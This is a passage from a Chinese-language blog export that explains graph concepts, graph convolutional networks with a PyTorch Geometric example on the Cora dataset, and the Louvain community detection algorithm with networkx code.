title="邻接矩阵"></a>邻接矩阵</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223714.png" alt="image-20230214223714069"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223807.png" alt="image-20230214223807728"></p><h3 id="可达矩阵"><a href="#可达矩阵" class="headerlink" title="可达矩阵"></a>可达矩阵</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230214223946.png" alt="image-20230214223946425"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230215090207.png" alt="image-20230215090207337"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230215090223.png" alt="image-20230215090223410"></p><p><img src="20230215090223.png"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>GCN</title>
      <link href="/2023/02/23/GCN/"/>
      <url>/2023/02/23/GCN/</url>
      
        <content type="html"><![CDATA[<h2 id="图卷积神经网络GCN"><a href="#图卷积神经网络GCN" class="headerlink" title="图卷积神经网络GCN"></a>图卷积神经网络GCN</h2><h2 id="1-GCN来源"><a href="#1-GCN来源" class="headerlink" title="1.GCN来源"></a>1.GCN来源</h2><h3 id="1-为什么CNN无法应用图数据"><a href="#1-为什么CNN无法应用图数据" class="headerlink" title="1. 为什么CNN无法应用图数据"></a>1. 为什么CNN无法应用图数据</h3><p>​         CNN 来说，其核心在于使用了基于卷积核的卷积操作来提取图像的特征，这里的卷积操作类似于对<strong>「计算区域内的中心节点和相邻节点进行加权求和」</strong>：</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424541.png" alt="image-20230225104507350"></p><p>无论卷积核平移到图片中的哪个位置都可以保证其运算结果的一致性，这就是我们所说的<strong>「平移不变性」</strong>。</p><p>网络是<strong>不规整</strong>的<strong>关系型数据</strong>，所以其不存在平移不变性（<strong>每个节点的周围邻居数不固定</strong>），这就使得传统的 CNN 方法无法直接应用于网络中。</p><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424399.png" alt="image-20230225104550237"></p><h3 id="2-GCN-提出"><a href="#2-GCN-提出" class="headerlink" title="2.GCN 提出"></a>2.GCN 提出</h3><p>​        深度学习一直都是被几大经典模型给统治着，如CNN、RNN等等，它们无论再CV还是NLP领域都取得了优异的效果，那这个GCN是怎么跑出来的？是因为我们发现了很多CNN、RNN无法解决或者效果不好的问题——图结构的数据。</p><p>​        <strong>图的结构一般来说是十分不规则的</strong>，可以认为是无限维的一种数据，所以它<strong>没有平移不变性</strong>。每一个节点的周围结构可能都是独一无二的，这种结构的数据，就让传统的CNN、RNN瞬间失效。这里涌现出了很多方法，例如GNN、DeepWalk、node2vec等等，GCN只是其中一种。</p><h2 id="2-GCN-算法"><a href="#2-GCN-算法" class="headerlink" title="2. GCN 算法"></a>2. GCN 算法</h2><h3 id="1-思想"><a href="#1-思想" class="headerlink" title="1.思想"></a>1.思想</h3><p>​       对于每个节点，我们从其所有邻居那里获得特征信息，当然还有自身的特征。然后通过聚合操作。我们将对所有节点执行相同的操作。最后，我们将值输入神经网络。</p><h3 id="2-GCN-核心公式"><a href="#2-GCN-核心公式" class="headerlink" title="2.GCN 核心公式"></a>2.GCN 核心公式</h3><h4 id="1-层级传播公式"><a href="#1-层级传播公式" class="headerlink" title="1.层级传播公式"></a>1.层级传播公式</h4><p><img src="https://raw.githubusercontent.com/GhyJn0/2023images/master/202303201424036.png" alt="image-20230225111810015"></p><p><code>注意事项：</code></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225112843.png" alt="image-20230225112843622"></p><h4 id="2-简单GCN-模型"><a href="#2-简单GCN-模型" class="headerlink" title="2. 简单GCN 模型"></a>2. 简单GCN 模型</h4><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225112147.png" alt="image-20230225112147502"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225112051.png" alt="image-20230225112051803"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225113927.png" alt="image-20230225113927849"></p><p><strong>GCN输入一个图，通过若干层GCN每个node的特征从X变成了Z，但是，无论中间有多少层，node之间的连接关系，即邻接矩阵A，都是共享的</strong></p><h3 id="3-GCN-层数理解"><a href="#3-GCN-层数理解" class="headerlink" title="3. GCN  层数理解"></a>3. GCN  层数理解</h3><p>​    <strong>图层数是结点要素可以行进的最远距离。</strong>例如，<strong>对于 1 层 GCN</strong>，<strong>每个节点只能从其邻居那里获取信息。</strong>收集信息的过程是<strong>独立**</strong>进行的，同时**针对所有节点。</p><p>​    当在<strong>第一层之上堆叠另一层时</strong>，我们重复收集信息的过程，但这一次，<strong>邻居已经有了关于他们自己的邻居的信息（来自上一步）</strong>。它将层数作为每个节点可以行进<strong>的最大跃点数</strong>。因此，根据我们认为节点应该从网络获取信息。</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225113254.png" alt="image-20230225113254847"></p><h2 id="3-GCN-算法步骤"><a href="#3-GCN-算法步骤" class="headerlink" title="3.GCN 算法步骤"></a>3.GCN 算法步骤</h2><h3 id="1-求图模型的邻接矩阵和度矩阵"><a href="#1-求图模型的邻接矩阵和度矩阵" class="headerlink" title="1. 求图模型的邻接矩阵和度矩阵"></a>1. 求图模型的<a href="https://so.csdn.net/so/search?q=%E9%82%BB%E6%8E%A5%E7%9F%A9%E9%98%B5&spm=1001.2101.3001.7020">邻接矩阵</a>和度矩阵</h3><p><strong>度矩阵</strong>，这个矩阵用来表示一个节点和多少个节点相关联</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225114048.png" alt="image-20230225114048023"></p><h3 id="2-特征计算"><a href="#2-特征计算" class="headerlink" title="2. 特征计算"></a>2. 特征计算</h3><p>求得矩阵A , D , X 后，进行特征的计算，来聚合邻居节点的信息</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225120648.png" alt="image-20230225120648038"></p><h3 id="3-注意事项"><a href="#3-注意事项" class="headerlink" title="3. 注意事项"></a>3. 注意事项</h3><blockquote><ol><li>邻接矩阵</li></ol></blockquote><p><strong>邻接矩阵 A 没有考虑自身的加权，所以<code>GCN中的邻接矩阵考虑自己</code>中的邻接矩阵实际上等于 A＋单位对角矩阵 I 。</strong></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225114553.png" alt="image-20230225114553673"></p><blockquote><ol start="2"><li>度矩阵归一化处理</li></ol></blockquote><p>​        首先对<strong>度矩阵的行和列进行了归一化</strong>，为什么这么做呢？</p><p>​    <strong>行归一化系数代表着节点自身的一个变化程度，关联的节点越少，系数越大，越容易随波主流</strong>，<strong>更易受别人影响。</strong></p><p>​    <strong>而列归一化系数，代表关联节点对当前节点的影响程度，关系网越复杂的节点，它对其他节点的作用就越小.</strong></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225114853.png" alt="image-20230225114853206"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225115051.png" alt="image-20230225115051719"></p><h2 id="4-GCN论文理解"><a href="#4-GCN论文理解" class="headerlink" title="4.GCN论文理解"></a>4.GCN论文理解</h2><h3 id="1-renormalization-trick-规则化"><a href="#1-renormalization-trick-规则化" class="headerlink" title="1.renormalization trick 规则化"></a>1.renormalization trick 规则化</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225110541.png" alt="image-20230225110541911"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225111859.png" alt="image-20230225111859026"></p><h3 id="2-GCN未经历训练和少量标注效果显著"><a href="#2-GCN未经历训练和少量标注效果显著" class="headerlink" title="2. GCN未经历训练和少量标注效果显著"></a>2. GCN未经历训练和少量标注效果显著</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225110819.png" alt="image-20230225110819119"></p><p><code>论文中GCN，即使是未经过训练的GCN 模型，凭借随机初始化的权重，也能达到更好的分类效果</code></p><p><img src="https://pic4.zhimg.com/80/v2-c1775cbb3f22cf7461f47d1a88d11a2f_720w.webp" alt="img"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwOTIyL2Y1MmUxOWFmN2Y2NTRhZmQ5ZGEyOGNkMzlhM2Q4ZGM3LmdpZg" alt="img"></p><p><code>作为半监督学习，GCN 可以在只标注少量样本的情况下学得出色的效果，下图为每个类别只标注一个样本的分类结果</code></p><h3 id="3-GCN-的深度思考"><a href="#3-GCN-的深度思考" class="headerlink" title="3. GCN 的深度思考"></a>3. GCN 的深度思考</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230225110943.png" alt="image-20230225110943053"></p><p><code>GCN论文中表明，目前GCN只局限于浅层，实验中使用2-3层GCN效果最好，为了加深，需要使用残差连接等trick，但是即使使用了这些trick，也只能勉强保存性能不下降，并没有提高</code></p><h2 id="5-GCN优缺点"><a href="#5-GCN优缺点" class="headerlink" title="5.GCN优缺点"></a>5.GCN优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><ol><li>权值共享，参数共享，从 AXW可以看出每一个节点的参数矩阵都是W，权值共享</li><li>具有局部性Local Connectivity，也就是局部连接的，因为每次聚合的只是一阶邻居</li><li>感受野正比于卷积层层数，第一层的节点只包含与直接相邻节点有关的信息，第二层以后，每个节点还包含相邻节点的相邻节点的信息，这样的话，参与运算的信息就会变多。</li></ol><h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><ol><li><p>扩展性差：由于训练时需要需要知道关于训练节点、测试节点在内的所有节点的邻接矩阵A，因此是transductive的，不能处理大图，然而工程实践中几乎面临的都是大图问题：[(36条消息) <a href="https://blog.csdn.net/yyl424525/article/details/100532849">论文笔记]：GraphSAGE：Inductive Representation Learning on Large Graphs 论文详解 NIPS 2017_不务正业的土豆的博客-CSDN博客</a></p></li><li><p>局限于浅层：GCN论文中表明，目前GCN只局限于浅层，实验中使用2层GCN效果最好，为了加深，需要使用残差连接等trick，但是即使使用了这些trick，也只能勉强保存性能不下降，并没有提高。</p></li><li><p>不能处理有向图：理由很简单，推导过程中用到拉普拉斯矩阵的特征分解需要满足拉普拉斯矩阵是对称矩阵的条件。</p></li></ol><h2 id="6-代码实现"><a href="#6-代码实现" class="headerlink" title="6. 代码实现"></a>6. 代码实现</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> torch<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn <span class="token keyword">as</span> nn<span class="token keyword">import</span> torch<span class="token punctuation">.</span>nn<span class="token punctuation">.</span>functional <span class="token keyword">as</span> F<span class="token keyword">from</span> torch_geometric<span class="token punctuation">.</span>nn <span class="token keyword">import</span> GCNConv<span class="token keyword">from</span> torch_geometric<span class="token punctuation">.</span>datasets <span class="token keyword">import</span> Planetoiddataset <span class="token operator">=</span> Planetoid<span class="token punctuation">(</span>root<span class="token operator">=</span><span class="token string">'./Cora'</span><span class="token punctuation">,</span>name<span class="token operator">=</span><span class="token string">'Cora'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>dataset<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">GCN</span><span class="token punctuation">(</span>nn<span class="token punctuation">.</span>Module<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        super<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>__init__<span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token comment" spellcheck="true">#二层卷积</span>        self<span class="token punctuation">.</span>conv1 <span class="token operator">=</span> GCNConv<span class="token punctuation">(</span>dataset<span class="token punctuation">.</span>num_node_features<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>conv2 <span class="token operator">=</span> GCNConv<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span>dataset<span class="token punctuation">.</span>num_classes<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">forward</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>        x<span class="token punctuation">,</span> edge_index <span class="token operator">=</span> data<span class="token punctuation">.</span>x<span class="token punctuation">,</span> data<span class="token punctuation">.</span>edge_index        x <span class="token operator">=</span> self<span class="token punctuation">.</span>conv1<span class="token punctuation">(</span>x<span class="token punctuation">,</span> edge_index<span class="token punctuation">)</span>        x <span class="token operator">=</span> F<span class="token punctuation">.</span>relu<span class="token punctuation">(</span>x<span class="token punctuation">)</span>        x <span class="token operator">=</span> F<span class="token punctuation">.</span>dropout<span class="token punctuation">(</span>x<span class="token punctuation">,</span> training<span class="token operator">=</span>self<span class="token punctuation">.</span>training<span class="token punctuation">)</span>        x <span class="token operator">=</span> self<span class="token punctuation">.</span>conv2<span class="token punctuation">(</span>x<span class="token punctuation">,</span> edge_index<span class="token punctuation">)</span>        <span class="token keyword">return</span> F<span class="token punctuation">.</span>log_softmax<span class="token punctuation">(</span>x<span class="token punctuation">,</span> dim<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">import</span> torch<span class="token punctuation">.</span>optim <span class="token keyword">as</span> optim<span class="token comment" spellcheck="true"># gpu加速</span>device <span class="token operator">=</span> torch<span class="token punctuation">.</span>device<span class="token punctuation">(</span><span class="token string">'cuda'</span> <span class="token keyword">if</span> torch<span class="token punctuation">.</span>cuda<span class="token punctuation">.</span>is_available<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">else</span> <span class="token string">'cpu'</span><span class="token punctuation">)</span>model <span class="token operator">=</span> GCN<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>data <span class="token operator">=</span> dataset<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>to<span class="token punctuation">(</span>device<span class="token punctuation">)</span>optimizer <span class="token operator">=</span> optim<span class="token punctuation">.</span>Adam<span class="token punctuation">(</span>model<span class="token punctuation">.</span>parameters<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>lr<span class="token operator">=</span><span class="token number">0.01</span><span class="token punctuation">,</span>weight_decay<span class="token operator">=</span><span class="token number">5e</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>model<span class="token punctuation">)</span>model<span class="token punctuation">.</span>train<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">for</span> epoch <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    optimizer<span class="token punctuation">.</span>zero_grad<span class="token punctuation">(</span><span class="token punctuation">)</span>    out <span class="token operator">=</span> model<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    loss <span class="token operator">=</span> F<span class="token punctuation">.</span>nll_loss<span class="token punctuation">(</span>out<span class="token punctuation">[</span>data<span class="token punctuation">.</span>train_mask<span class="token punctuation">]</span><span class="token punctuation">,</span>data<span class="token punctuation">.</span>y<span class="token punctuation">[</span>data<span class="token punctuation">.</span>train_mask<span class="token punctuation">]</span><span class="token punctuation">)</span>    loss<span class="token punctuation">.</span>backward<span class="token punctuation">(</span><span class="token punctuation">)</span>    optimizer<span class="token punctuation">.</span>step<span class="token punctuation">(</span><span class="token punctuation">)</span>model<span class="token punctuation">.</span>eval<span class="token punctuation">(</span><span class="token punctuation">)</span>pred <span class="token operator">=</span> model<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>argmax<span class="token punctuation">(</span>dim<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print(pred)</span><span class="token comment" spellcheck="true">#pred1 = pred[data.test_mask].cpu().numpy()</span><span class="token comment" spellcheck="true"># data1 = data[data.test_mask].cpu().numpy()</span><span class="token comment" spellcheck="true">#print(pred1)</span><span class="token comment" spellcheck="true">#print(data.y[data.test_mask])</span>correct <span class="token operator">=</span> <span class="token punctuation">(</span>pred<span class="token punctuation">[</span>data<span class="token punctuation">.</span>test_mask<span class="token punctuation">]</span> <span class="token operator">==</span> data<span class="token punctuation">.</span>y<span class="token punctuation">[</span>data<span class="token punctuation">.</span>test_mask<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>item<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>correct<span class="token punctuation">)</span>acc <span class="token operator">=</span> int<span class="token punctuation">(</span>correct<span class="token punctuation">)</span> <span class="token operator">/</span> int<span class="token punctuation">(</span>data<span class="token punctuation">.</span>test_mask<span class="token punctuation">.</span>sum<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>acc<span class="token punctuation">)</span></code></pre><p><a href="https://colab.research.google.com/github/FighterLYL/GraphNeuralNetwork/blob/master/chapter5/GCN_Cora.ipynb#scrollTo=feHONSuEX4oH">GCN_Cora.ipynb - Colaboratory (google.com)</a></p><p><a href="https://blog.csdn.net/m0_53961910/article/details/127856355">从0到1实现GCN——最详细的代码实现_gcn代码_早睡早起困得早的博客-CSDN博客</a> </p><h2 id="7-GCN实现方式库对比"><a href="#7-GCN实现方式库对比" class="headerlink" title="7.GCN实现方式库对比"></a>7.GCN实现方式库对比</h2><p><a href="https://www.bilibili.com/video/BV1BR4y1a7pt/?spm_id_from=pageDriver&vd_source=5e8f069711510b3788382a0a03ff38e5">cogdl实现GNN模型_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1924y1v7Dn/?spm_id_from=333.999.0.0&vd_source=5e8f069711510b3788382a0a03ff38e5">pyg-3-pyg与dgl的对比_哔哩哔哩_bilibili</a></p><h2 id="8-参考链接代码论文视频讲解"><a href="#8-参考链接代码论文视频讲解" class="headerlink" title="8.参考链接代码论文视频讲解"></a>8.参考链接代码论文视频讲解</h2><p><strong>代码：</strong></p><p><a href="https://colab.research.google.com/github/FighterLYL/GraphNeuralNetwork/blob/master/chapter5/GCN_Cora.ipynb#scrollTo=feHONSuEX4oH">GCN_Cora.ipynb - Colaboratory (google.com)</a></p><p><a href="https://blog.csdn.net/qq_38234785/article/details/107984924#_38">GCN及代码实现_不染心的博客-CSDN博客_gcn代码</a></p><p><strong>参考博客：</strong></p><p><a href="https://blog.csdn.net/weixin_50706330/article/details/127468165">GCN-图卷积神经网络算法讲解（通俗版）_gcn图卷积网络_99.99％的博客-CSDN博客</a></p><p><a href="https://blog.csdn.net/qq_50595984/article/details/127365520">通俗易懂的GCN原理讲解_听弧丶的博客-CSDN博客</a></p><p><a href="https://ai.plainenglish.io/graph-convolutional-networks-gcn-baf337d5cb6b">图卷积网络 |作者：周范 |简明英语的人工智能 (plainenglish.io)</a></p><p><a href="https://www.zhihu.com/question/54504471">如何理解 Graph Convolutional Network（GCN）？ - 知乎 (zhihu.com)</a></p><p><strong>通俗理解：</strong></p><p><a href="https://blog.csdn.net/liuweiyuxiang/article/details/98957612">图卷积神经网络(GCN)_Lavi_qq_2910138025的博客-CSDN博客</a></p><p><strong>论文：</strong></p><p>[<a href="https://arxiv.org/abs/1609.02907">1609.02907] 使用图卷积网络的半监督分类 (arxiv.org)</a></p><p><strong>视频讲解</strong>：</p><p><a href="https://www.bilibili.com/video/BV1gg411x7fH/?spm_id_from=333.337.search-card.all.click&vd_source=5e8f069711510b3788382a0a03ff38e5">《图卷积神经网络GCN——大白话讲解升级版》这下总会了吧！！_哔哩哔哩_bilibili</a></p><p><a href="https://www.bilibili.com/video/BV1UZ4y1m7fh/?spm_id_from=333.788&vd_source=5e8f069711510b3788382a0a03ff38e5">图神经网络GCN从理论到底层实现与项目实战 3_哔哩哔哩_bilibili</a></p><p><a href="https://zhuanlan.zhihu.com/p/74242097">GraphSAGE：我寻思GCN也没我牛逼 - 知乎 (zhihu.com)</a></p><p>重点推荐：</p><p><a href="https://www.zhihu.com/question/54504471/answer/332657604">如何理解 Graph Convolutional Network（GCN）？ - 知乎 (zhihu.com)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 图神经网络 </tag>
            
            <tag> 社区划分 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Louvain算法</title>
      <link href="/2023/01/11/Louvain/"/>
      <url>/2023/01/11/Louvain/</url>
      
        <content type="html"><![CDATA[<h2 id="louvain算法"><a href="#louvain算法" class="headerlink" title="louvain算法"></a>louvain算法</h2><h2 id="1-社区"><a href="#1-社区" class="headerlink" title="1.社区"></a>1.社区</h2><h3 id="1-简介"><a href="#1-简介" class="headerlink" title="1. 简介"></a>1. 简介</h3><p>在最常见的社交网络中，每个用户相当一个点，用户之间的互相关注、点赞、私信等形成了边，用户以及相互作用关系构成了一个大的关系网络。在这样的网络中，有的用户之间的连接较为紧密，有的用户之间的连接关系较为稀疏。其中连接较为紧密的部分可以被看成一个社区，其内部的节点之间有<strong>较为紧密</strong>的连接，而在两个社区间则相对连接<strong>较为稀疏，</strong>整个整体的结构被称为社团结构，如下图，红色的黑色的点集呈现出社区的结构。</p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230112095600.png" alt="image-20230112095600631"></p><p><code>用红色的点和黑色的点对其进行标注，整个网络被划分成了两个部分，这两个部分的内部连接较为紧密，而这两个社区之间的连接则较为稀疏。</code></p><h3 id="2-特性"><a href="#2-特性" class="headerlink" title="2. 特性"></a>2. 特性</h3><p>各类网络中会存在一些紧密连接的区域，这些区域（节点集）通常有自己的属性，称为<strong>社群或者社团（Community）</strong>，社团内部连接紧密，而社团外部的连接则相对稀疏，即“内紧外松”.</p><h3 id="3-社区发现算法"><a href="#3-社区发现算法" class="headerlink" title="3.社区发现算法"></a>3.社区发现算法</h3><p>社区发现的算法多种思路，比较常见的有两种：一种是<strong>分离的思路，就是找出社区之间的边，把这些边从图中移除</strong>；另一种是<strong>聚合思路</strong>，<strong>将联系紧密的节点聚合为一个社区，并通过优化某个相关变量的函数来实现聚合</strong>。 </p><p>前人已在两个思路上有了大量的研究，而根据这两类算法的结果看，<strong>聚合的思路比分离思路好，且算法的效率也比较高</strong>。</p><h2 id="2-模块度"><a href="#2-模块度" class="headerlink" title="2.模块度"></a>2.模块度</h2><h3 id="1-模块度的意义"><a href="#1-模块度的意义" class="headerlink" title="1.模块度的意义"></a>1.模块度的意义</h3><p>“社群检测”等同于“给节点分组”，<strong>模块度（Modularity）</strong>是一种常用的衡量节点<strong>分组质量</strong>的标准，<strong>模块度越高说明所检测到的社团越符合“内紧外松”的特征，分组质量越好</strong>。</p><h3 id="2-模块度计算"><a href="#2-模块度计算" class="headerlink" title="2.模块度计算"></a>2.模块度计算</h3><blockquote><ol><li>公式</li></ol></blockquote><p><img src="https://img-blog.csdnimg.cn/69b5fdb988674cc3801d4dec8687e20e.png" alt="zz"></p><blockquote><p>2 .简化公式</p></blockquote><p><img src="https://img-blog.csdnimg.cn/70d5c0cc8e2045268d99fdbfd7749d3e.png" alt="模块度公式简化"></p><p><strong>其中Σ Σin表示社区c内的边的权重之和，Σ Σtot表示与社区c内的节点相连的边的权重之和</strong></p><blockquote><ol start="3"><li>模块度的理解</li></ol></blockquote><p><strong>社区内部边的权重减去所有与社区节点相连的边的权重和</strong>，对无向图更好理解，<strong>即社区内部边的度数减去社区内节点的总度数</strong>。</p><p><strong>基于模块度的社区发现算法，都是以最大化模块度Q为目标。</strong></p><h3 id="3-模块度增益"><a href="#3-模块度增益" class="headerlink" title="3. 模块度增益"></a>3. 模块度增益</h3><p><img src="https://img-blog.csdnimg.cn/0493c781f6c04cf499e85b37aa3dd671.png" alt="模块度增益"></p><p> <strong>ki,in表示实际节点i与要移入社区B之间的连接边的权重之和</strong>, </p><p><strong>求和tot 表示与社区c相连边的权重之和</strong></p><p><strong>ki表示与i节点相连的边权重之和</strong></p><p><strong>第一项若比第二项大则说明节点i</strong>与<strong>该社 区B的连接程度是具有显著的意义的</strong>, 那么<strong>便加入到该社区, 反之则不加入</strong>。</p><p>原文链接：<a href="https://blog.csdn.net/weixin_39419040/article/details/127085401">https://blog.csdn.net/weixin_39419040/article/details/127085401</a></p><h2 id="3-louvain算法"><a href="#3-louvain算法" class="headerlink" title="3. louvain算法"></a>3. louvain算法</h2><h3 id="1-louvain算法由来"><a href="#1-louvain算法由来" class="headerlink" title="1. louvain算法由来"></a>1. louvain算法由来</h3><p>如密歇根大学的M.E.J.Newman和康奈尔大学的M.Girvan，他们在2<strong>003年提出了一个基于模块属性的测量方法</strong>。他们在算法中引入了一个变量【<strong>模块度</strong>】，用于衡量社区划分结果的合理性。其原<strong>理是用某种划分结果的模块内聚性与随机划分结果的内聚性的差异，对划分结果进行评估，找到模块内聚性最优的划分</strong>。虽然寻找最优随机划分往往非常困难，但这个思路给大家指引了优化方向。</p><p>模块度的思路对后来的社区发现算法有很重要的影响，很多有影响的算法都是基于该特性进行算法设计的。 2008年，以比利时鲁汶大学的Vincent D.Blondel为主的几位学者，提出了基于模块度的一个快速算法：<strong>Louvain算法。该算法可以快速处理具有数以亿计节点的网络</strong>，<strong>用模块度度对社区划分的质量进行评估</strong></p><h3 id="2-算法步骤"><a href="#2-算法步骤" class="headerlink" title="2.算法步骤"></a>2.算法步骤</h3><p>1）将<strong>图中的每个节点</strong>看成<strong>一个独立的社区</strong>，社区的数目与节点个数相同；</p><p>2）<strong>对每个节点i</strong>，依次尝试把<strong>节点i分配到</strong>其<strong>每个邻居节点所在的社区</strong>，<strong>计算分配前与分配后的模块度变化Δ</strong> ，并<strong>记录Δ 最大的那个邻居节点</strong>，<strong>如果 Δ &gt;0，则把节点i分配Δ 最大的那个邻居节点所在的社区</strong>，<strong>否则保持不变</strong>；</p><p>3）重复2），<strong>直到所有节点的所属社区不再变化</strong>；<code>节点合并</code></p><p>4）<strong>对图进行压缩</strong>，将<strong>所有在同一个社区的节点压缩成一个新节点</strong>，<strong>社区内节点之间的边的权重转化为新节点的环的权重</strong>，<strong>社区间的边权重转化为新节点间的边权重</strong>；</p><p><strong>5）重复1）直到整个图的模块度不再发生变化。</strong><code>社区聚合</code></p><h2 id="4-Louvain算法例子"><a href="#4-Louvain算法例子" class="headerlink" title="4. Louvain算法例子"></a>4. Louvain算法例子</h2><h3 id="1-例图"><a href="#1-例图" class="headerlink" title="1.例图"></a>1.例图</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230112105736.png" alt="image-20230112105736136"></p><h3 id="2-节点合并"><a href="#2-节点合并" class="headerlink" title="2.节点合并"></a>2.节点合并</h3><blockquote><ol><li>以A为例子</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230112111811.png" alt="image-20230112111811552"></p><p><code>重点：小于0则不进行社区划分，大于0则取最大的模块度增益对应节点进行合并</code></p><blockquote><ol start="2"><li>其他节点接着计算</li></ol></blockquote><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230112111933.png" alt="image-20230112111933415"></p><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230112112021.png" alt="image-20230112112021449"></p><p><strong>此时：节点合并结束</strong></p><h3 id="3-社区聚合"><a href="#3-社区聚合" class="headerlink" title="3.社区聚合"></a>3.社区聚合</h3><p><img src="https://gitee.com/hexofox/pic/raw/master/images/20230112114157.png" alt="image-20230112114157514"></p><p><strong><code>注意：graph的权重发生改变了，m=10而不是30，因为此时划分出来的社区已经拿走了一部分边的权重了，所以实际上整个graph的权重应该去除社区内的边的权重重新计算。</code></strong></p><p><strong>根据上面的计算可以知道模块度增益都是小于0的，迭代停止，此时即为最终的社区划分的结果；</strong></p><h2 id="5-Louvain代码"><a href="#5-Louvain代码" class="headerlink" title="5. Louvain代码"></a>5. Louvain代码</h2><blockquote><ol><li>测试数据</li></ol></blockquote><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># 调用并测试分群的结果                                                                                       </span><span class="token keyword">from</span> community <span class="token keyword">import</span> community_louvain<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>cm <span class="token keyword">as</span> cm<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> networkx <span class="token keyword">as</span> nx<span class="token comment" spellcheck="true"># load the karate club graph</span>G <span class="token operator">=</span> nx<span class="token punctuation">.</span>karate_club_graph<span class="token punctuation">(</span><span class="token punctuation">)</span>partition <span class="token operator">=</span> community_louvain<span class="token punctuation">.</span>best_partition<span class="token punctuation">(</span>G<span class="token punctuation">)</span></code></pre><blockquote><p>2, louvain 实现社区划分</p></blockquote><pre class=" language-python"><code class="language-python">pos <span class="token operator">=</span> nx<span class="token punctuation">.</span>spring_layout<span class="token punctuation">(</span>G<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># color the nodes according to their partition</span>cmap <span class="token operator">=</span> cm<span class="token punctuation">.</span>get_cmap<span class="token punctuation">(</span><span class="token string">'viridis'</span><span class="token punctuation">,</span> max<span class="token punctuation">(</span>partition<span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span>nx<span class="token punctuation">.</span>draw_networkx_nodes<span class="token punctuation">(</span>G<span class="token punctuation">,</span>                        pos<span class="token punctuation">,</span>                        partition<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span><span 